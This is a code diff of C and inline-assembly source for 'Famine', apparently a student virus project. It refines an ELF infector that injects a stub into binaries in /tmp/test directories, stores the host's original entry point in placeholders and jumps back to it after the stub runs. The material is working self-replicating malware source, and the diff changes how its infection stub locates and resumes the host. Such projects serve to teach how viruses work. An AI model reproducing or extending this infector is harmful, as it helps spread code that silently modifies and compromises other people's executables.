@@ -12,31 +12,51 @@
 
 #include "../include/famine.h"
 
+__attribute__((section(".rodata.placeholders")))
+// __attribute__((retain)) // NOTE: needs (GCC 11 and binutils 2.36) or (Clang 13 and (binutils 2.36 or ld.lld 13))
+struct placeholders volatile placeholders = { // NOTE: volatile makes sure the variables are taken from here, their values are not inlined
+	.entry = 0x1111111111111111,
+	.phdr = 0,
+	.stub_len = 0,
+};
+
+#if NOSTD
+void _start();
+#endif
+
 #if CREATE_STUB
 
 int main(void) {
 	// FIXME: should get the stub from the executable itself,
 	//        we will need to add some variables which locate the placeholders
 	//        instead of searching through the text
-	infect_dir("/tmp/test", stub_bin, stub_bin_len);
-	infect_dir("/tmp/test2", stub_bin, stub_bin_len);
+	size_t offset = (uintptr_t)&placeholders - (uintptr_t)&_start;
+	infect_dir("/tmp/test", (void*)&_start, placeholders.stub_len, offset);
+	infect_dir("/tmp/test2", (void*)&_start, placeholders.stub_len, offset);
+	write(-1, (void*)&offset, 0); // TODO: temporary just to make "placeholders" stay
 	LOG("done\n");
+	LOG("placeholder offset: %zu\n", offset);
 	return (0);
 }
 
 #else
 
 int main(void) {
-	infect_dir("/tmp/test", stub_bin, stub_bin_len);
-	infect_dir("/tmp/test2", stub_bin, stub_bin_len);
+	void *site = memmem(stub_bin, stub_bin_len, (void*)&placeholders.entry, sizeof(placeholders.entry));
+	if (site == NULL) {
+		LOG("Placeholders not found\n");
+		return (1);
+	}
+	size_t offset = (uintptr_t)site - (uintptr_t)stub_bin - offsetof(struct placeholders, entry);
+	infect_dir("/tmp/test", stub_bin, stub_bin_len, offset);
+	infect_dir("/tmp/test2", stub_bin, stub_bin_len, offset);
 	LOG("done\n");
+
 	return (0);
 }
 
 #endif // CREATE_STUB
 
-// #define NOSTD 1
-// #define CREATE_STUB 1
 #if CREATE_STUB
 #if NOSTD
 #else
@@ -46,12 +66,8 @@ int main(void) {
 
 #if NOSTD
 
-__attribute__((section(".signature")))
 __attribute__((used))
-char const signature[] = "Famine version 1.0 (c)oded by cbopp-mvan-wij";
-
-__attribute__((used))
-size_t my_start(size_t *rsp) {
+size_t my_start(size_t *rsp, size_t *load_base_ptr) {
 	size_t argc = rsp[0];
 	char **argv = (char**)&rsp[1];
 	char **envp = &argv[argc + 1];
@@ -69,12 +85,14 @@ size_t my_start(size_t *rsp) {
 	size_t load_base = 0;
 	for (size_t i = 0; auxv[i] != AT_NULL; i += 2) {
 		if (auxv[i] == AT_PHDR) {
-			load_base = auxv[i + 1];
+			load_base = auxv[i + 1] - placeholders.phdr;
 			break;
 		}
 	}
+	*load_base_ptr = load_base;
+
 	// sys_exit(0);
-	return load_base;
+	return load_base + placeholders.entry;
 }
 
 #if CREATE_STUB
@@ -85,18 +103,19 @@ void _start() {
 	// callee-saved RBX, RSP, RBP, and R12–R15
 	asm volatile(
 		"movq %%rdx, %%rbx\n" // save rtld_fini
-		"leaq (%%rsp), %%rdi\n" // pass address of rsp to my_start
+		"movq %%rsp, %%rdi\n" // pass address of rsp to my_start
+		"subq $8, %%rsp\n" // reserve space for load_base
+		"movq %%rsp, %%rsi\n" // pass address to load_base
 		"call my_start\n"
-		"movq %%rax, %%rbp\n" // rbp = load_base
+		"popq %%rbp\n" // rbp = load_base
 		"movq %%rbx, %%rdx\n" // restore rtld_fini
-		"movq $0xAAAAAAAAAAAAAAAA, %%r11\n" // placeholder for e_entry
-		"add %%rbp, %%r11\n" // + load_base = actual runtime entry
-		"jmpq *%%r11\n"
+		"jmpq *%%rax\n"
 		:
 	);
 }
 
 #else
+#error just use libc if you're not going to create a stub
 
 __attribute__((section("._start")))
 __attribute__((naked))
@@ -104,7 +123,9 @@ void _start() {
 	// callee-saved RBX, RSP, RBP, and R12–R15
 	asm volatile(
 		"movq %%rdx, %%rbx\n" // save rtld_fini
-		"leaq (%%rsp), %%rdi\n" // pass address of rsp to my_start
+		"movq %%rsp, %%rdi\n" // pass address of rsp to my_start
+		"subq $8, %%rsp\n" // reserve space for load_base
+		"movq %%rsp, %%rsi\n" // pass address to load_base
 		"call my_start\n"
 		"xorq %%rdi, %%rdi\n"
 		"movq $60, %%rax\n"
